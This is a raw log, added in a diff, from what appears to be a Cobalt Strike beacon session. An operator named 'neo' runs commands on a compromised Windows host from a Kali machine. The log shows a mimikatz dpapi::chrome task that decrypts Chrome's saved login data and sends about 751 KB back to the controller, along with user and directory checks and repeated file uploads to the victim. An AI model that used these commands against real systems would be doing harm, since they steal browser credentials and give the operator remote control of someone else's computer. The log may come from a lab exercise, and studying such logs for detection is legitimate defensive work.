@@ -1,0 +1,36 @@
+12/19 12:49:33 UTC [metadata] 192.168.1.20 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 9948; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/19 12:49:43 UTC [input] <neo> chromedump
+12/19 12:49:43 UTC [task] <T1093> Tasked beacon to run mimikatz's dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect command
+12/19 12:50:28 UTC [checkin] host called home, sent: 751215 bytes
+12/19 12:51:11 UTC [input] <neo> pwd
+12/19 12:51:11 UTC [task] <> Tasked beacon to print working directory
+12/19 12:51:30 UTC [checkin] host called home, sent: 27 bytes
+12/19 12:51:30 UTC [output]
+Current directory is C:\Users\david\AppData\Local\Temp\RarSFX9
+
+12/19 12:52:30 UTC [checkin] host called home, sent: 441 bytes
+12/19 12:52:48 UTC [input] <neo> upload /home/kali/Desktop/text (C:\text)
+12/19 12:52:48 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/text as C:\text
+12/19 12:52:48 UTC [indicator] file: 0102b5b6877229243d50e0f3a6a2c8b8 5853 bytes C:\text
+12/19 12:53:30 UTC [checkin] host called home, sent: 5924 bytes
+12/19 12:53:30 UTC [error] could not upload file: 5
+12/19 12:53:57 UTC [input] <neo> upload /home/kali/Desktop/text (C:\text)
+12/19 12:53:57 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/text as C:\text
+12/19 12:53:57 UTC [indicator] file: 0102b5b6877229243d50e0f3a6a2c8b8 5853 bytes C:\text
+12/19 12:54:30 UTC [checkin] host called home, sent: 5904 bytes
+12/19 12:54:30 UTC [error] could not upload file: 5
+12/19 12:55:19 UTC [input] <neo> dllload
+12/19 12:55:19 UTC [error] dllload error: not enough arguments
+12/19 12:59:03 UTC [input] <neo> getuid
+12/19 12:59:03 UTC [task] <> Tasked beacon to get userid
+12/19 12:59:30 UTC [checkin] host called home, sent: 8 bytes
+12/19 12:59:30 UTC [output]
+You are ACER\david
+
+12/19 13:16:30 UTC [checkin] host called home, sent: 40 bytes
+12/19 13:16:30 UTC [output]
+beacon exit.
+
+12/19 13:17:09 UTC [input] <neo> upload /home/kali/Desktop/Upload/text (C:\Users\david\text)
+12/19 13:17:09 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/Upload/text as C:\Users\david\text
+12/19 13:17:09 UTC [indicator] file: 0102b5b6877229243d50e0f3a6a2c8b8 5853 bytes C:\Users\david\text
